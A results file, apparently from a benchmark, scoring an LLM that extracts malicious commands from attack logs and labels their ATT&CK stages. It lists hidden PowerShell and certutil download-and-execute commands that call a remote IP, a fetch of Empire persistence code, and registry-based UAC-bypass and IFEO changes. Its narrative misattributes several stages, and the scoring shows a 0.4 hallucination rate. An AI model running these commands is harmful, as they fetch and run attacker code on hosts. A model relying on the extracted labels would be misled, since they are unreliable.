@@ -1,0 +1,168 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2605\u670d\u89aa\uc774\ub098\uac80\ub2e8\ubb38\ub3d4.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a C:\\Users\\Administrator\\AppData\\Local\\Temp\\j41io40a.js",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\\\47\\u2605\\u670d\\u89aa\\uC774\\uB098\\uAC80\\uB2E8\\uBB38\\uB3D4.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\\47\\u2605\\u670d\\u89aa\\uC774\\uB098\\uAC80\\uB2E8\\uBB38\\uB3D4.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\\47\\u2605\\u670d\\u89aa\\uC774\\uB098\\uAC80\\uB2E8\\uBB38\\uB3D4.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1119 ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest t1547.001 -TestNumbers 1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\\\msxsl.exe' 'c:\\\\Windows\\\\Temp\\\\msxsl.exe'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.005 -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/persistence/Persistence.ps1' -UseBasicParsing)}",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item -Path HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command -Force New-ItemProperty -Path HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command -Name DelegateExecute -Value \"\" -Force Set-ItemProperty -Path HKCU:\\\\software\\\\classes\\\\ms-setting",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\image file execution options \\\\ /v verifierdlls \\\\ /d \"1 \" \\\\ /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg delete HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\image file execution options \\\\ /v verifierdlls \\\\ /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\\\Invoke-PSImage.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The system has been subject to various attacks starting with initial access via powershell bypassing execution policy, followed by multiple instances of code execution, command and control communication with an unknown server, discovery activities such as invoking atomic tests, collection attempts using invoke-psimage, persistence efforts through registry modifications, privilege escalation using image file execution options modification, defense evasion techniques like modifying the TLS version, credential access through new-itemproperty commands, lateral movement attempts by adding registry entries, and exfiltration attempts.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 74734,
+      "completion_tokens": 2261,
+      "total_tokens": 76995,
+      "wall_clock_s": 97.755,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.41379310344827586,
+      "recall": 0.26666666666666666,
+      "f1": 0.32432432432432434,
+      "tp": 12,
+      "fp": 17,
+      "fn": 33
+    },
+    "stage": {
+      "precision": 0.3793103448275862,
+      "recall": 0.25,
+      "f1": 0.3013698630136986,
+      "tp": 11,
+      "fp": 18,
+      "fn": 33,
+      "recall_partial": 0.10810810810810811
+    },
+    "hallucination_rate": 0.4,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 74734,
+      "completion_tokens": 2261,
+      "total_tokens": 76995,
+      "wall_clock_s": 97.755,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
